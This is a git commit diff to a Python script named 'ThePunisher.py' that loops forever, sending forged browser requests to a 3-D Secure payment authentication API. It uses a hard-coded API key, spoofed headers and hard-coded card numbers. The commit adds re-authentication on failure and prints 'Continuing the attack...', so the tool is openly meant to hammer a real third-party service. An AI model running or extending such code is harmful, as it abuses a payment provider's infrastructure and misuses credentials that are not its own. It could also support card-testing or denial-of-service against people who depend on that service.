df90e4ae9da48ba421bf3e39985a40264271d8dd
acharya8848 <anubhavacharya@icloud.com>
2022-04-08 03:23:45 -0400

    Re-authenticate fix

--- ThePunisher.py
+++ ThePunisher.py
@@ -8,56 +8,87 @@ from time import sleep
 
 def requests():
 	do_auth = True
+	AUTHORIZE_URL = "https://api.3dsintegrator.com/v2/authorize"
+	REQUEST_URL = "https://api.3dsintegrator.com/v2/authenticate/browser"
+	AMEX = "376679044357470"
+	MASTERCARD = "5165531056143880"
+
+	auth_header = { # Working
+		"authority": "api.3dsintegrator.com",
+		"method": "POST",
+		"path": "/v2/authorize",
+		"scheme": "https",
+		"accept": "*/*",
+		"accept-encoding": "gzip, deflate, br",
+		"accept-language": "en-US,en;q=0.9",
+		"content-length": "0",
+		"content-type": "application/json",
+		"dnt": "1",
+		"sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"",
+		"sec-ch-ua-mobile": "?0",
+		"sec-ch-ua-platform": "\"Windows\"",
+		"sec-fetch-dest": "empty",
+		"sec-fetch-mode": "cors",
+		"sec-fetch-site": "cross-site",
+		"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
+		"x-3ds-api-key": "52343fe01e99f26eab489969b9718c20",
+		"x-3ds-sdk-version": "2.1.0.20210929"
+	}
+
+	auth_data = { # Working
+		"accept": "*/*",
+		"accept-encoding": "gzip, deflate, br",
+		"accept-language": "en-US,en;q=0.9",
+		"content-length": "0",
+		"content-type": "application/json",
+		"dnt": "1",
+		"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
+		"sec-ch-ua-mobile": "?0",
+		"sec-ch-ua-platform": '"Windows"',
+		"sec-fetch-dest": "empty",
+		"sec-fetch-mode": "cors",
+		"sec-fetch-site": "cross-site",
+		"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
+		"x-3ds-api-key": "52343fe01e99f26eab489969b9718c20",
+		"x-3ds-sdk-version": "2.1.0.20210929",
+	}
+
+	card_data = { # Working
+		"pan": MASTERCARD,
+		"amount": 3.37,
+		"month": "03",
+		"year": "27",
+		"protocolVersion": "2.1.0",
+		"messageCategory": "01",
+		"browser": {
+			"browserAcceptHeader": "application/json",
+			"browserJavaEnabled": "false",
+			"browserJavascriptEnabled": "true",
+			"browserLanguage": "en-US",
+			"browserColorDepth": "24",
+			"browserScreenWidth": "1920",
+			"browserScreenHeight": "1080",
+			"browserTZ": "240",
+			"browserUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
+		},
+		"challengeIndicator": "02",
+		"challengeWindowSize": "01",
+		"threeDSRequestorURL": "http://paay.co",
+		"transactionForcedTimeout": "20"
+	}
+
 	while True:
-		AUTHORIZE_URL = "https://api.3dsintegrator.com/v2/authorize"
-		REQUEST_URL = "https://api.3dsintegrator.com/v2/authenticate/browser"
-		AMEX = "376679044357470"
-		MASTERCARD = "5165531056143880"
-
-		auth_header = { # Working
-			"authority": "api.3dsintegrator.com",
-			"method": "POST",
-			"path": "/v2/authorize",
-			"scheme": "https",
-			"accept": "*/*",
-			"accept-encoding": "gzip, deflate, br",
-			"accept-language": "en-US,en;q=0.9",
-			"content-length": "0",
-			"content-type": "application/json",
-			"dnt": "1",
-			"sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"",
-			"sec-ch-ua-mobile": "?0",
-			"sec-ch-ua-platform": "\"Windows\"",
-			"sec-fetch-dest": "empty",
-			"sec-fetch-mode": "cors",
-			"sec-fetch-site": "cross-site",
-			"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
-			"x-3ds-api-key": "52343fe01e99f26eab489969b9718c20",
-			"x-3ds-sdk-version": "2.1.0.20210929"
-		}
-
-		auth_data = { # Working
-			"accept": "*/*",
-			"accept-encoding": "gzip, deflate, br",
-			"accept-language": "en-US,en;q=0.9",
-			"content-length": "0",
-			"content-type": "application/json",
-			"dnt": "1",
-			"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
-			"sec-ch-ua-mobile": "?0",
-			"sec-ch-ua-platform": '"Windows"',
-			"sec-fetch-dest": "empty",
-			"sec-fetch-mode": "cors",
-			"sec-fetch-site": "cross-site",
-			"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
-			"x-3ds-api-key": "52343fe01e99f26eab489969b9718c20",
-			"x-3ds-sdk-version": "2.1.0.20210929",
-		}
 		if do_auth:
-			authentication = post(AUTHORIZE_URL, headers=auth_header)
-			authorization = authentication.headers["Authorization"]
-			do_auth = False
-			# print(authorization)
+			try:
+				authentication = post(AUTHORIZE_URL, headers=auth_header)
+				authorization = authentication.headers["Authorization"]
+			except:
+				print("Failed to authenticate. Waiting for 10 seconds...")
+				sleep(10)
+				continue
+			else:
+				print("Authenticated. Continuing the attack...")
+				do_auth = False
 
 		card_header = { # Working
 			"authority": "api.3dsintegrator.com",
@@ -84,34 +115,11 @@ def requests():
 			"x-3ds-sdk-version": "2.1.0.20210929"
 		}
 
-		card_data = { # Working
-			"pan": MASTERCARD,
-			"amount": 3.37,
-			"month": "03",
-			"year": "27",
-			"protocolVersion": "2.1.0",
-			"messageCategory": "01",
-			"browser": {
-				"browserAcceptHeader": "application/json",
-				"browserJavaEnabled": "false",
-				"browserJavascriptEnabled": "true",
-				"browserLanguage": "en-US",
-				"browserColorDepth": "24",
-				"browserScreenWidth": "1920",
-				"browserScreenHeight": "1080",
-				"browserTZ": "240",
-				"browserUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
-			},
-			"challengeIndicator": "02",
-			"challengeWindowSize": "01",
-			"threeDSRequestorURL": "http://paay.co",
-			"transactionForcedTimeout": "20"
-		}
-
 		transaction = post(REQUEST_URL, headers=card_header, json=card_data)
-		print(transaction.text, transaction.status_code)
 		if transaction.status_code != 400:
 			do_auth = True
+		else:
+			print(transaction.text, transaction.status_code)
 		sleep(1)
 
 def main():
